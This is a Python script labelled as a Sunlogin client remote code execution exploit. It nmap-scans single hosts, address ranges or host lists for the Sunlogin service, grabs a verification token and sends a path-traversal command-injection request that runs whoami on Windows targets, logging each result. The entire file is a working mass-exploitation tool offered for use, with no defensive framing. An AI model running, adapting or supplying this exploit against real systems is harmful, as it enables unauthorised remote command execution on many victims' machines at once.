from concurrent.futures import thread
import IPy
from py import process
import requests
import json
import sys
from subprocess import PIPE, Popen
from multiprocessing.pool import ThreadPool
import argparse
from sympy import re
import re as reg
import time

filename = time.strftime("%Y-%m-%d %H-%M-%S", time.localtime())+"_sunlogin.txt"

def pwn(target):
    global vul_list
    session = requests.session()
    burp0_url = "http://%s/cgi-bin/rpc?action=verify-haras" % target
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                     "Cache-Control": "max-age=0"}
    res = json.loads(session.get(burp0_url, headers=burp0_headers).text)
    token = res.get('verify_string')
    print("[+] Get token: {}".format(token))
    burp0_url = "http://%s/check?cmd=ping../../../../../../../../../../../windows/system32/whoami" % target
    burp0_cookies = {"CID": token}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                     "Cache-Control": "max-age=0"}
    res = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print("[+] Get command result: \r\n\t %s" % res.text)
    with open(file=filename,mode="a") as f:
        f.write(target+" Get command result:"+res.text+"\n")


def curl(host_WithPort):
    url = "http://%s" % host_WithPort
    try:
        result = requests.get(url,timeout=5)
        if result.text == "{\"success\":false,\"msg\":\"Verification failure\"}":
            return host_WithPort
    except:
        pass

def fuzz_sunloginPort(target):
    print("[*] %s\tFuzzing sunlogin port" % target)
    process = Popen("nmap -p 10000-65535 --min-rate=10000 -T4 %s" % target, stdout=PIPE, stderr=None, shell=True)
    # process = Popen("nmap -p 40000-65535 -T2 %s" % target, stdout=PIPE, stderr=None, shell=True)
    ports_raw = process.communicate()[0].decode("utf-8",errors="ignore")
    ports = reg.findall("([\d]+/tcp)",ports_raw)
    for i in range(len(ports)):
        ports[i] = ports[i].strip("/tcp")
    print("[*] Get ports: %s" % ports)
    if not ports:
        return
    print("[*] Enumerating port of sunlogin")
    host_WithPort = [str(target) + ":" + x for x in ports]
    tp = ThreadPool(50)
    result = tp.map(curl, (host_WithPort))
    result_filter = [i for i in result if i]
    if result_filter == []:
        print("[-] Could not find sunlogin port or target not vulnerable")
        return
    else:
        print("[*] Target may vulnerability, try to pwn it out.")
        for i in result_filter:
            pwn(i)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="Sunlogin client RCE exploit with port fuzzing")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t','--target', action='store',help="specify target with sunlogin client installed,suport "
                                                            "192.168.1.1 or 192.168.1.1/24")
    group.add_argument('-f','--file', action='store',help="Specify the destination IP file")
    options = parser.parse_args()
    if options.target is None and options.file is None:
        parser.print_help()
        sys.exit(1)
    else:
        if options.target is None:
            with open(file=options.file,mode="r") as f:
                hosts = f.readlines()
            for ip in hosts:
                fuzz_sunloginPort(ip.strip("\n"))
        else:
            if "/" in options.target:
                try:
                    hosts = IPy.IP(options.target)
                    for host in hosts:
                        fuzz_sunloginPort(host)
                except Exception as e:
                    print (e)
            else:
                fuzz_sunloginPort(options.target)
